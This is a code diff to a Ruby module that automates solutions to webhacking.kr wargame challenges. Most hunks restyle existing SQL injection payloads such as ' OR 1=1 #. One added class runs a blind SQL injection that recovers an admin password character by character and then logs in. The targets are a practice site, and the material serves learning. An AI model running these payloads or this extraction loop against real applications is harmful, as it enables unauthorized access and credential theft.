@@ -110,7 +110,6 @@ module WebhackingKR
       )
       response.body
     end
-
   end
 
   ##
@@ -136,7 +135,7 @@ module WebhackingKR
     CHALLENGE = 3
 
     PATH = '/challenge/web-03/'
-    PAYLOAD = %q[' OR 1=1 #]
+    PAYLOAD = "' OR 1=1 #"
 
     def exec
       log('Submitting answer')
@@ -250,7 +249,7 @@ module WebhackingKR
 
     def exec
       log("Registering the user '#{LOGIN}'")
-      response = post(
+      post(
         PATH_JOIN,
         {
           'id' => LOGIN,
@@ -311,7 +310,7 @@ module WebhackingKR
 
     PATH = '/challenge/web-07/'
     QUERY = '?val='
-    PAYLOAD = %q[SELECT(3))UNION(SELECT(SUBSTR(HEX(34),1,1)))#]
+    PAYLOAD = 'SELECT(3))UNION(SELECT(SUBSTR(HEX(34),1,1)))#'
 
     def exec
       log('Trying send payload')
@@ -333,12 +332,11 @@ module WebhackingKR
 
     PATH = '/challenge/web-08/'
     USER_AGENT = 'agentx'
-    PAYLOAD = %q[', '', 'admin') #]
+    PAYLOAD = "', '', 'admin') #"
 
     def exec
-      payload = URI.encode_www_form_component(PAYLOAD)
       log('Sending payload')
-      response = get(
+      get(
         PATH,
         { 'User-Agent' => "#{USER_AGENT}#{PAYLOAD}" }
       )
@@ -445,7 +443,7 @@ module WebhackingKR
     CHALLENGE = 17
 
     PATH = '/challenge/js-4/'
-    UNLOCK = 780929.71
+    UNLOCK = 780_929.71
 
     def exec
       response = get("#{PATH}?#{UNLOCK}")
@@ -460,7 +458,7 @@ module WebhackingKR
 
     PATH = '/challenge/web-32/'
     QUERY = '?no='
-    PAYLOAD = %q[''OR`id`='admin']
+    PAYLOAD = "''OR`id`='admin'"
 
     def exec
       payload = URI.encode_www_form_component(PAYLOAD)
@@ -534,6 +532,65 @@ module WebhackingKR
         )
         check(response.body)
       end
+    end
+  end
+
+  ##
+  # Challenge 21
+  class Challenge21 < ChallengeBase
+    CHALLENGE = 21
+
+    PATH = '/challenge/bonus-1/'
+    PARAM_ID = 'id'
+    PARAM_PW = 'pw'
+    LOGIN = 'admin'
+    PAYLOAD = "' OR (`id` = '#{LOGIN}' AND `pw` LIKE BINARY '$PW$') #"
+    ALPHABET =
+      ('a'..'z').to_a +
+      ('A'..'Z').to_a +
+      (0..9).to_a +
+      ['_', '-']
+
+    def exec
+      password = String.new
+      search = true
+      log('Searching password')
+      while search
+        ALPHABET.each_with_index do |char, i|
+          payload = PAYLOAD.sub('$PW$', "#{password}#{char}%")
+          query = URI.encode_www_form(
+            PARAM_ID => 'id',
+            PARAM_PW => payload
+          )
+
+          response = get("#{PATH}?#{query}")
+          unless response.body =~ /wrong password/
+            if i == ALPHABET.length - 1
+              search = false
+              break
+            end
+            next
+          end
+
+          password << char
+          log(password)
+          break
+        end
+      end
+
+      if password.empty?
+        failed('Password not found')
+        return
+      end
+
+      log("Password found: #{password}")
+      log('Logging in')
+      query = URI.encode_www_form(
+        PARAM_ID => LOGIN,
+        PARAM_PW => password
+      )
+      response = get("#{PATH}?#{query}")
+      check(response.body)
     end
   end
 
